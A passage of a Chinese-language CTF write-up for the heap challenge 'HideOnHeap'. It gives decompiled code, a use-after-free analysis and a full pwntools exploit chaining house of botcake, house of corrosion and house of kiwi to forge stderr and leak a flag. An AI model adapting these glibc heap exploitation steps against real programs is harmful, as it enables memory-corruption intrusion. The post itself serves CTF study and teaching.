class="hljs-number">1</span> )<br>  &#123;<br>    idx = (<span class="hljs-type">int</span>)v0;                              <span class="hljs-comment">// 根据Size是否为0分配下标</span><br>    <span class="hljs-keyword">if</span> ( !Size[v0] )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( ++v0 == <span class="hljs-number">32</span> )                           <span class="hljs-comment">// 最多32个</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;FULL\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;Size:&quot;</span>);<br>  size = <span class="hljs-built_in">get_LInt</span>();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(size - <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0x14FE</span> )   <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID SIZE\n&quot;</span>);<br>  addr = <span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !addr )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID POINT\n&quot;</span>);<br>  Size[idx] = size;<br>  heap_array[idx] = addr;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;DONE\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>根据下标确定堆块，检查了堆块指针是否非空和size是否大于0，若通过就可以编辑堆块。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> idx; <span class="hljs-comment">// eax</span><br>  __int64 idx_0; <span class="hljs-comment">// rbx</span><br><br>  <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;Index:&quot;</span>);<br>  idx = <span class="hljs-built_in">get_LInt</span>();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)idx &gt; <span class="hljs-number">31</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID INDEX\n&quot;</span>);<br>  idx_0 = idx;<br>  <span class="hljs-keyword">if</span> ( !*((_QWORD *)&amp;heap_array + idx) || !Size[idx] )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID INDEX\n&quot;</span>);<br>  <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;Content:&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;heap_array + idx_0), Size[idx_0]);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;DONE\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>根据下标确定堆块，只检查了堆块指针是否非空没有检查size是否大于0，并且释放堆块后只是将size置为0，所以存在UAF漏洞，但是由于编辑功能检查了size，所以释放后无法编辑。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx; <span class="hljs-comment">// eax</span><br>  __int64 idx_0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">void</span> *addr; <span class="hljs-comment">// rdi</span><br><br>  <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;Index:&quot;</span>);<br>  idx = <span class="hljs-built_in">get_LInt</span>();<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0x1F</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID INDEX\n&quot;</span>);<br>  idx_0 = (<span class="hljs-type">int</span>)idx;<br>  addr = (<span class="hljs-type">void</span> *)heap_array[idx];<br>  <span class="hljs-keyword">if</span> ( !addr )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID INDEX\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(addr);                                   <span class="hljs-comment">// UAF | double free</span><br>  Size[idx_0] = <span class="hljs-number">0</span>;                              <span class="hljs-comment">// free之后无法edit</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;DONE\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="利用思路-4"><a href="#利用思路-4" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先，我们的目标使泄露堆块中的flag，即堆块内容。</p>
<p>由于程序只是使用了read和write进行输入输出,没有IO函数，所以不能通过stdout泄露数据。并且程序没有打印堆块数据的功能，所以无法泄露libc基址和堆块地址。</p>
<p>利用 <code>__malloc_assert</code> 中的 <code>__fxprintf</code> ，这个函数是一个 IO 函数，并且进入内部发现在第一个参数传参为 NULL 时，会变化成 stderr，所以可以想到利用 伪造 stderr 结构来泄露堆块上的数据。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>		 <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>		     __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>		     file, line,<br>		     function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>		     assertion);<br>  <span class="hljs-built_in">fflush</span> (stderr);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>

<p>因此，需要修改stderr的 <code>_flags</code> 和 <code>_IO_write_base</code> 。其中 <code>_IO_write_base</code> 必须是flag所在堆块地址的附近。所以我们现在需要劫持stderr，修改其中的 <code>_IO_write_base</code> 为堆块地址</p>
<p>由于程序只存在UAF漏洞，所以利用<code>house of botcake</code>构造 <code>chunk overlapping</code> (同一区域同时存在unsortedbin和tcache中)，此处需要注意在申请unsortedbin时要让tcache中的堆块的fd等于<code>main_arena+offset</code>，然后再修改后2字节，使tcache中的堆块指向stderr（1&#x2F;16几率）。再申请两次即可获取其控制权。</p>
<p>由于不知道堆块地址，所以我们需要一种攻击方式来写<code> _IO_write_base</code> 为堆块地址，例如largebin attack，但是由于释放后的堆块无法编辑，所以利用 <code>house of corrision</code> 攻击实现目标。采用上述相同的方式可以控制 <code>global_max_fast</code>（1&#x2F;16几率）,然后根据<code>_IO_write_base</code>与<code>main_arena.fastbinY</code>的偏移计算出需要申请的堆块大小。申请之后再修改<code>global_max_fast</code>为一个大数，释放后再修改为0x80。</p>
<p>此时再修改stderr的<code>_flags</code>,并将<code>_IO_write_base</code>的最后2字节修改为适当字节，使能够输出flag。</p>
<p>一切就绪，现在就需要报错触发执行<code>__malloc_assert</code>即可。这里采用<code>house of Wiki</code>中的方式：修改<code>top chunk</code>的大小为一个小值，然后申请一个大于它的堆块即可。</p>
<blockquote>
<p>其实不用house of botcake也可以控制tcache中的堆块，只需要释放之后，用另一个下标申请刚释放的堆块。然后利用UAF漏洞再次释放原下标即可用另一个下标修改tcache中的堆块。但是由于不知道libc地址所以这里只能使用house of botcake</p>
</blockquote>
<h3 id="Exp-4"><a href="#Exp-4" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :house of botcake + house of corrision + house of Wiki + house of </span><br><span class="hljs-string">@时间        :2022/02/12 10:15:39</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = 0<br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,29972)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./HideOnHeap&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./HideOnHeap&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(size):<br>    p.sendlineafter(<span class="hljs-string">&quot;Choice:&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Size:&quot;</span>,str(size))<br><br>def <span class="hljs-built_in">edit</span>(idx,cnt):<br>    p.sendlineafter(<span class="hljs-string">&quot;Choice:&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,str(idx))<br>    p.sendafter(<span class="hljs-string">&quot;Content:&quot;</span>,cnt)<br><br>def delete(idx):<br>    p.sendlineafter(<span class="hljs-string">&quot;Choice:&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,str(idx))<br><br>success(<span class="hljs-string">&quot;House of Botcake...&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    <span class="hljs-built_in">add</span>(0x100)<br><br><span class="hljs-built_in">add</span>(0x10) #9 gap<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    delete(i) #0~6<br><br>delete(8)<br>delete(7)<br><span class="hljs-built_in">add</span>(0x100) # 0<br>delete(8)<br><br><span class="hljs-built_in">add</span>(0x80) #1<br><span class="hljs-built_in">add</span>(0x70) #2<br><span class="hljs-built_in">add</span>(0x80) #3 overlapping fd被修改<br><span class="hljs-built_in">add</span>(0x70) #4<br><span class="hljs-built_in">edit</span>(3,b<span class="hljs-string">&#x27;\x80\x4b&#x27;</span>) #   修改前2字节，碰撞到global_max_fast<br><br><span class="hljs-built_in">add</span>(0x100) #5 3<br><span class="hljs-built_in">add</span>(0x100) #6 global_max_fast<br><br><br>delete(9)<br><span class="hljs-comment"># gdb.attach(p)</span><br>success(<span class="hljs-string">&quot;House of Botcake...&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    <span class="hljs-built_in">add</span>(0x110) #7~15<br><br><span class="hljs-built_in">add</span>(0x20) #16 gap<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    delete(i+7) #7~13<br><br>delete(14)<br>delete(15)<br><span class="hljs-built_in">add</span>(0x110) #7<br>delete(15)<br><br><span class="hljs-built_in">add</span>(0xa0) #8<br><span class="hljs-built_in">add</span>(0x60) #9<br><span class="hljs-built_in">add</span>(0xa0) #10 overlapping<br><span class="hljs-built_in">add</span>(0x60) #11<br><br><span class="hljs-built_in">edit</span>(10,b<span class="hljs-string">&#x27;\xc0\x25) # 修改前2字节，碰撞到stderr 0x7ffff7fc25c0</span><br><span class="hljs-string">add(0x110) #12</span><br><span class="hljs-string">add(0x110) #13 stderr</span><br><span class="hljs-string"></span><br><span class="hljs-string">success(&quot;House of Corrosion...&quot;)</span><br><span class="hljs-string">add(0x14b0) #14</span><br><span class="hljs-string">edit(6,p32(0x66666666)) # 修改global_max_fast 必须要在申请大chunk之后再修改global_max_fast</span><br><span class="hljs-string">delete(14)</span><br><span class="hljs-string">edit(13,p64(0xfbad1800)+p64(0)*3+b&#x27;</span>\x90\xb2<span class="hljs-string">&#x27;) # 修改stderr</span><br><span class="hljs-string"></span><br><span class="hljs-string">edit(6,p32(0x80)) # 修改global_max_fast</span><br><span class="hljs-string"></span><br><span class="hljs-string">success(&quot;House of Kiwi...&quot;)</span><br><span class="hljs-string">add(0x420) #14</span><br><span class="hljs-string">delete(14)</span><br><span class="hljs-string">delete(0)</span><br><span class="hljs-string">delete(1)</span><br><span class="hljs-string">add(0x420) #0</span><br><span class="hljs-string">delete(14)</span><br><span class="hljs-string">add(0x410) #1</span><br><span class="hljs-string">edit(0,b&#x27;</span>\x00<span class="hljs-string">&#x27;*0x410+p64(0) + p64(0x231)) # 修改top chunk</span><br><span class="hljs-string">delete(1) </span><br><span class="hljs-string"></span><br><span class="hljs-string">add(0x700) # 触发house of wiki __malloc_assert </span><br><span class="hljs-string"></span><br><span class="hljs-string">data = p.recvuntil(b&#x27;</span>&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">p.recv()</span><br><span class="hljs-string">i = data.find(b&quot;flag&quot;)</span><br><span class="hljs-string"># j = data.find(b&quot;&#125;&quot;) + 1</span><br><span class="hljs-string">success(str(data[i:]))</span><br><span class="hljs-string"></span><br><span class="hljs-string"># gdb.attach(p)</span><br><span class="hljs-string">p.interactive()</span><br><span class="hljs-string">p.close()</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<h3 id="Summary-4"><a href="#Summary-4" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>house of botcake可以在不知道libc基址的情况下使tcache指向libc（1&#x2F;16几率）</li>
<li>read和write是系统调用，不是IO函数，是不使用缓冲区的。它直接将内容写入到对应的文件中（或直接从对应的文件中读取），因为write，read函数是直接使用文件描述符的，并不使用FILE结构。</li>
</ul>
<h3 id="Reference-4"><a href="#Reference-4" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/winmt/articles/15887841.html">https://www.cnblogs.com/winmt/articles/15887841.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/15890280.html#hideonheap">https://www.cnblogs.com/LynneHuan/p/15890280.html#hideonheap</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.wjhwjhn.com/archives/783/">http://blog.wjhwjhn.com/archives/783/</a></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF-WriteUp/">CTF-WriteUp</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/12/31/2020ByteCTF-gun/">
                        <span class="hidden-mobile">2020ByteCTF-gun</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"2GYV17CUmss2VIOWS1MFpfqj-gzGzoHsz","appKey":"0R4wcvymx9kXQiyeaw8t2otu","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/RunData.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  




  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
